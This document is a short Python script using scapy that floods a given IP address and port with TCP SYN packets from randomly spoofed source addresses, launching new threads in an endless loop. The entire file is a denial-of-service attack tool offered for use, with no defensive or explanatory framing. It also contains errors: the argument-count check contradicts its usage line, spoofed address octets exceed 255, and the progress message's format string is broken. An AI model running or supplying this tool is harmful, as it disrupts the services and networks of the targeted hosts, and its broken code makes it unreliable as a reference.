import socket
import random
import sys
import threading

from scapy.all import *

if len(sys.argv) != 5:
	print "Usage: %s <TargetIp> <Port>" % sys.argv[0]
	sys.exit(1)


target = sys.argv[1]

port = int(sys.argv[2])

total = 0

conf.iface = 'en1'

class syn(threading.Thread):

    global target
    global port
    
    def __init__(self):
        threading.Thread.__init__(self)
    
    def run(self):
    #source randomizing information
        s = IP()
        
        s.src = "%i.%i.%i.%i" % (random.randint(1,1024), random.randint(1,1024),random.randint(1,1024),random.randint(1,1024))
        
        s.dst = target
        
        #target information
        
        t = TCP()
        
        t.sport = random.randint(1,65000)
        
        t.dport = port
        
        t.flags = 'S'
        
        send(s/t, verbose=0)

print "Currently attempting flooding on %s:%i with SYN packets." % (target, port)

while 1:
    syn().start()
    total += 1
    sys.stdout.write("\rCurrent total packets sent: \t\t\t%i % total")
